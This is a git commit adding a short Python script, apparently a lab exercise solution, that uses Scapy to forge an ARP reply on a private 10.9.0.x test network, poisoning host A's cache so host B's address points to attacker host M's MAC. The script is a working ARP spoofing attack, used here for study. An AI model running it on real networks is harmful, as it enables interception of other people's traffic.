9fcd0bf0744c79766266ffe0f16bec38577204f9
anand-deeparmor <anand.va@deeparmor.com>
2024-07-18 01:15:59 +0530

    Create task1b.py

---
+++ task1b.py
@@ -0,0 +1,24 @@
+#!/usr/bin/env python3
+hostAIP = '10.9.0.5'
+hostBIP = '10.9.0.6'
+hostrMIP = '10.9.0.105'
+
+blancMAC = 'ff:ff:ff:ff:ff:ff'
+hostAMAC = '02:42:0a:09:00:05'
+hostBMAC = '02:42:0a:09:00:06'
+hostMMAC = '02:42:0a:09:00:69'
+
+SEND = 1
+REPLY = 2
+INTERVAL = 5
+
+from scapy.all import * 
+import time
+
+# Scenario 1: host B's ip is already in host A's cache
+E = Ether(dst=blancMAC, src=hostMMAC)
+A = ARP(op=REPLY, hwsrc=hostMMAC, psrc=hostBIP, pdst=hostAIP)
+
+pkt = E/A
+ls(pkt)
+sendp(pkt)
